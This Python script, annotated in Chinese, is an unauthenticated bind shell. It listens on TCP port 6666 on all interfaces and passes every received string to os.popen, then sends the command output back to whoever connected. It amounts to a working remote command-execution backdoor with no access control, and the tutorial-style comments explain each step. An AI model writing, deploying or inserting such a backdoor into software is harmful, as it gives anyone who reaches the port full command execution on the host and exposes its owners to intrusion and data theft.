#coding: utf-8
from socket import *
from os import *


s = socket(AF_INET, SOCK_STREAM)
# 第一个参数是"服务器之间网络通信", 第二个参数是"流式socket , for TCP"
s.bind(('', 6666))
# 将套接字绑定到地址，第一个参数是绑定本机，地二个参数是端口号6666
s.listen(1)
# 开始监听传入连接，参数里面的数字表示最大连接数量
while True:
# 设置一个循环
	sock, addr = s.accept()
	# 接受连接并返回（conn,address）,其中conn是新的套接字对象，可以用来接收和发送数据。address是连接客户端的地址。
	print('Connect by ', addr)
	# 打印
	while True:
	# 循环
		cmd = sock.recv(1024)
		# 接受信息
		if cmd == 'exit':
		# 判断是否为exit
			sock.close()
			# 断开连接
			break
			# 跳出循环
		result = popen(cmd).read()
		# 执行上面接收到的cmd命令
		sock.send(result)
		# 发送执行cmd命令的结果